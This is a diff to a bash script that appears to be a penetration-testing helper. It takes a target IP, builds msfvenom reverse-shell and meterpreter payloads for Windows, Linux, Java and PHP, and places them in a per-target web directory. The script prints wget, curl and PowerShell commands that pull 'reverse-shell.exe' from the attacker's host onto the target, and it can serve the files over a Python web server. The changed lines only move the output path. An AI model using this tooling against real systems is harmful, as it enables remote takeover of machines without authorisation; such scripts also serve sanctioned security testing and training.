@@ -4,10 +4,10 @@ read -p  'IP? > ' IP
 
 flg0="0"
 
-if [ -d /root/www/revshell/$IP ]; then
+if [ -d /var/www/html/$IP ]; then
    echo ""
 else
-   mkdir /root/www/revshell/$IP
+   mkdir /var/www/html/$IP
 fi
 
 if [ -d /root/Lab/$IP/sandbox ]; then
@@ -121,31 +121,31 @@ do
 
    if [ $os = 'windows' ] ; then
       if [ $bit = '86' ] ; then
-         script1="msfvenom -p "$os"/"$payload"/reverse_tcp LHOST="$lhost" LPORT="$lport" -f "$ftype" > /root/www/revshell/"$os"_"$bit"_"$payload"_"$lhost"_"$lport"."$ftype
+         script1="msfvenom -p "$os"/"$payload"/reverse_tcp LHOST="$lhost" LPORT="$lport" -f "$ftype" > /var/www/html/$IP/"$os"_"$bit"_"$payload"_"$lhost"_"$lport"."$ftype
       elif [ $bit = "64" ] ; then
-         script1="msfvenom -p "$os"/x64/"$payload"/reverse_tcp LHOST="$lhost" LPORT="$lport" -f "$ftype" > /root/www/revshell/"$os"_"$bit"_"$payload"_"$lhost"_"$lport"."$ftype
+         script1="msfvenom -p "$os"/x64/"$payload"/reverse_tcp LHOST="$lhost" LPORT="$lport" -f "$ftype" > /var/www/html/$IP/"$os"_"$bit"_"$payload"_"$lhost"_"$lport"."$ftype
       fi
    fi
          
    if [ $os = 'linux' ] ; then
-      script1="msfvenom -p "$os"/x"$bit"/"$payload"/reverse_tcp LHOST="$lhost" LPORT="$lport" -f "$ftype" > /root/www/revshell/"$os"_"$bit"_"$payload"_"$lhost"_"$lport"."$ftype
+      script1="msfvenom -p "$os"/x"$bit"/"$payload"/reverse_tcp LHOST="$lhost" LPORT="$lport" -f "$ftype" > /var/www/html/$IP/"$os"_"$bit"_"$payload"_"$lhost"_"$lport"."$ftype
    fi
                   
    if [ $os = 'java' ] ; then
       payload="shell"
       if [ $ftype = "jsp" ] ; then
-         script1="msfvenom -p "$os"/jsp_"$payload"_reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw > /root/www/revshell/"$os"_"$payload"_"$lhost"_"$lport"."$ftype
+         script1="msfvenom -p "$os"/jsp_"$payload"_reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw > /var/www/html/$IP/"$os"_"$payload"_"$lhost"_"$lport"."$ftype
       elif [ $ftype = "war" ] ; then
-         script1="msfvenom -p "$os"/jsp_"$payload"_reverse_tcp LHOST="$lhost" LPORT="$lport" -f war > /root/www/revshell/"$os"_"$payload"_"$lhost"_"$lport"."$ftype
+         script1="msfvenom -p "$os"/jsp_"$payload"_reverse_tcp LHOST="$lhost" LPORT="$lport" -f war > /var/www/html/$IP/"$os"_"$payload"_"$lhost"_"$lport"."$ftype
       fi
    fi
       
    if [ $os = 'php' ] ; then
       if [ $ftype = "php" ] ; then
          if [ $payload = "meterpreter" ] ; then
-            script1="msfvenom -p php/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw > /root/www/revshell/php_"$payload"_$lhost"_"$lport.php"
+            script1="msfvenom -p php/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw > /var/www/html/$IP/php_"$payload"_$lhost"_"$lport.php"
          elif [ $payload = "shell" ] ; then
-            script1="msfvenom -p php/reverse_php LHOST="$lhost" LPORT="$lport" -f raw > /root/www/revshell/php_"$payload"_$lhost"_"$lport.php"
+            script1="msfvenom -p php/reverse_php LHOST="$lhost" LPORT="$lport" -f raw > /var/www/html/$IP/php_"$payload"_$lhost"_"$lport.php"
          fi
       fi
    fi
@@ -190,18 +190,18 @@ cat /root/Lab/$IP/sandbox/revshell.sh | cut -d " " -f9
 fpath=$(cat /root/Lab/$IP/sandbox/revshell.sh | cut -d " " -f9 | cut -d "/" -f5)
 echo ""
 
-echo "wget http://"$lhost":80/revshell/"$fpath
-echo "curl -OL http://"$lhost":80/revshell"$fpath
+echo "wget http://"$lhost":80/$IP/"$fpath
+echo "curl -OL http://"$lhost":80/$IP/"$fpath
 str1='powershell.exe -c "(new-object System.Net.WebClient).DownloadFile('
-str2="'http://"$lhost":80/revshell/"$fpath"','C:\Users\Public\reverse-shell.exe')"
+str2="'http://"$lhost":80/$IP/"$fpath"','C:\Users\Public\reverse-shell.exe')"
 str3='"'
 echo $str1$str2$str3
 str1='Invoke-WebRequest -Uri "'
-str2='http://'$lhost':80/revshell/'$fpath'" -OutFile "C:\Users\Public\reverse-shell.exe"'
+str2='http://'$lhost':80/$IP/'$fpath'" -OutFile "C:\Users\Public\reverse-shell.exe"'
 echo $str1$str2
 
 if [ $input = 'y' ] ; then
-   echo "cd /root/www" >> /root/Lab/$IP/sandbox/temp.sh
+   echo "cd /var/www/html/$IP/" >> /root/Lab/$IP/sandbox/temp.sh
    echo "python3 -m http.server 80" >> /root/Lab/$IP/sandbox/temp.sh
 fi 
 
